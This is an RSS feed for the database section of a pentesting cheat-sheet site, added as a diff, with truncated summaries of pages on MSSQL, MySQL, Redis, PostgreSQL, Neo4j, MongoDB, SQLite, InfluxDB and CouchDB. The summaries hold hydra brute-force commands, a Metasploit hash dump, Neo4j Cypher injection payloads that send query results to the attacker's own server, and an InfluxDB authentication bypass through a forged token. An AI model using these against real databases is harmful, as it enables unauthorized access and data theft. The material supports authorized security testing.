@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Database on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/database/</link>
+    <description>Recent content in Database on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:22:31 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/database/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>MSSQL (Microsoft SQL) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/mssql-pentesting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/mssql-pentesting/</guid>
+      <description>Enumeration link nmap --script ms-sql-info -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-config -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-* -p 1433 &amp;lt;target-ip&amp;gt; # MSDAT: https://github.com/quentinhardy/msdat # all: Enumerate with all modules python3 msdat.py all -s example.com # -D, -U, -P: Use Windows authentication python3 msdat.py all -s example.com -D domain -U username -P password # xpdirectory: List directories in system python3 msdat.py xpdirectory -s manager.htb -D manager -U operator -P operator -d master --list-files &amp;#39;C:\&amp;#39; # bulkopen: Read/download files python3 msdat.</description>
+    </item>
+    <item>
+      <title>MySQL Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</link>
+      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</guid>
+      <description>Enumeration link nmap --script mysql-info -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-enum -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-brute -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-databases -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-users -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-* -p 3306 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; mysql hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; mysql Configuration Files link cat /etc/mysql/my.cnf cat /etc/mysql/mysql.conf.d/mysqld.cnf Connect linkmysql command can be replaced with mariadb .</description>
+    </item>
+    <item>
+      <title>Redis Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/redis-pentesting/</link>
+      <pubDate>Sat, 09 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/redis-pentesting/</guid>
+      <description>Enumeration link nmap --script redis-info -p 6379 &amp;lt;target-ip&amp;gt; nmap --script redis-brute -p 6379 &amp;lt;target-ip&amp;gt; msf&amp;gt; use auxiliary/scanner/redis/redis_server Check Config File linkIf we have access to target system, find the configuration file then we may be able to get passwords.&#xA;find / -name &amp;#34;redis.conf&amp;#34; 2&amp;gt;/dev/null grep -i pass /path/to/redis.conf If we get the line with password written as below,&#xA;requirepass &amp;#34;password&amp;#34; We can set the password in a redis client.&#xA;&amp;gt; auth &amp;#34;password&amp;#34; Connect link redis-cli -h &amp;lt;target-ip&amp;gt; -p 6379 # with password redis-cli -h &amp;lt;target-ip&amp;gt; -p 6379 -a password # using socket redis-cli -s /path/to/redis.</description>
+    </item>
+    <item>
+      <title>PostgreSQL Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/postgresql-pentesting/</link>
+      <pubDate>Sat, 17 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/postgresql-pentesting/</guid>
+      <description>Enumeration link nmap --script pgsql-brute -p 5432 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; postgres hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; postgres # Metasploit msfconsole msf&amp;gt; use auxiliary/scanner/postgres/postgres_login msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; run Dump User Hashes link msfconsole msf&amp;gt; use auxiliary/scanner/postgres/postgres_hashdump msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set username &amp;lt;username&amp;gt; msf&amp;gt; set password &amp;lt;password&amp;gt; msf&amp;gt; run Config File link # Version 14.x /etc/postgresql/14/main/postgresql.conf # Version 15.x /etc/postgresql/15/main/postgresql.</description>
+    </item>
+    <item>
+      <title>Neo4j Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</link>
+      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</guid>
+      <description>Default Credentials link neo4j:neo4j Common Directories &amp;amp; Files in Local System link /var/lib/neo4j /var/log/neo4j Cypher Injection linkBefore injecting payloads, we need to start local web server to fetch the result of the query.&#xA;sudo python3 -m http.server 80 Below are payloads.&#xA;In some payloads, replace 10.0.0.1 with your ip address.&#xA;&amp;lt;!-- Get Neo4j version --&amp;gt; &amp;#39; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &amp;#39;http://10.</description>
+    </item>
+    <item>
+      <title>MongoDB Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/mongodb-pentesting/</link>
+      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/mongodb-pentesting/</guid>
+      <description>Enumeration link nmap --script mongodb-info -p 27017 &amp;lt;target-ip&amp;gt; nmap --script mongodb-databases -p 27017 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; mysql hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; mysql Connect link # Local mongo mongo --port 27017 # Remote mongo --host &amp;lt;target-ip&amp;gt; --port 27017 -u username -p password mongo &amp;#34;mongodb://&amp;lt;target-ip&amp;gt;:27017&amp;#34; mongo &amp;#34;mongodb://username:password@&amp;lt;target-ip&amp;gt;:27017/?authSource=admin&amp;#34; Basic Commands link # All databases &amp;gt; show dbs # Current database &amp;gt; db # Switch database if it exists, or create new if not exist &amp;gt; use db_name # Collections &amp;gt; show collections # Run javascript file &amp;gt; load(&amp;#34;example.</description>
+    </item>
+    <item>
+      <title>SQLite Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/sqlite-pentesting/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/sqlite-pentesting/</guid>
+      <description>Interpreter link sqlite3 sample.db # or sqlitebrowser sample.db Commands link # Help sqlite&amp;gt; .help # Show databases sqlite&amp;gt; .databases # Show tables sqlite&amp;gt; .tables # Show table information sqlite&amp;gt; pragma table_info(table_name); # Dump contents of tables sqlite&amp;gt; .dump &amp;lt;table&amp;gt; # SQL commands sqlite&amp;gt; select * from &amp;lt;table&amp;gt;; # Exit the interpreter sqlite&amp;gt; .quit </description>
+    </item>
+    <item>
+      <title>InfluxDB Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/influxdb-pentesting/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/influxdb-pentesting/</guid>
+      <description>Enumeration link # User enumeration curl http://&amp;lt;target-ip&amp;gt;:8086/debug/requests Connect link influx -host 10.0.0.1 -port 8086 influx -host 10.0.0.1 -port 8086 -database &amp;lt;database&amp;gt; influx -host 10.0.0.1 -port 8086 -username &amp;lt;username&amp;gt; -password &amp;lt;password&amp;gt; # Import db file influx -path example.db Authentication Bypass (CVE-2019-20933) version ≤ 1.7.6 linkAutomation linkhttps://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933&#xA;Manual linkReference: https://www.komodosec.com/post/when-all-else-fails-find-a-0-day&#xA;Firse find the username.&#xA;curl http://&amp;lt;target-ip&amp;gt;:8086/debug/requests Then create a JWT using the name we found in jwt.io.&#xA;Parameters are below:&#xA;Header: { “sub”: “123456789”, &amp;#34;alg&amp;#34;: &amp;#34;HS256&amp;#34;, &amp;#34;typ&amp;#34;: &amp;#34;JWT&amp;#34; } Payload: { &amp;#34;username&amp;#34;: &amp;#34;**&amp;lt;username&amp;gt;**&amp;#34;, &amp;#34;exp&amp;#34;:21548669066 } Verify Signature: HMACSHA256(base64UrlEncode(header) &amp;#43; &amp;#34;.</description>
+    </item>
+    <item>
+      <title>CouchDB Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/couchdb-pentesting/</link>
+      <pubDate>Wed, 28 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/couchdb-pentesting/</guid>
+      <description>Directories link # List all databases /_all_dbs # Show information of the database /&amp;lt;db_name&amp;gt; # Futon administration interface /_utils/ # Temporary View /_utils/database.html?&amp;lt;database_name&amp;gt;/_temp_view Basic Operations link # Create a new database curl -X PUT https://example.com:5984/&amp;lt;new_database_name&amp;gt; # Delete a database curl -X DELETE https://example.com:5984/&amp;lt;database_name&amp;gt; </description>
+    </item>
+  </channel>
+</rss>
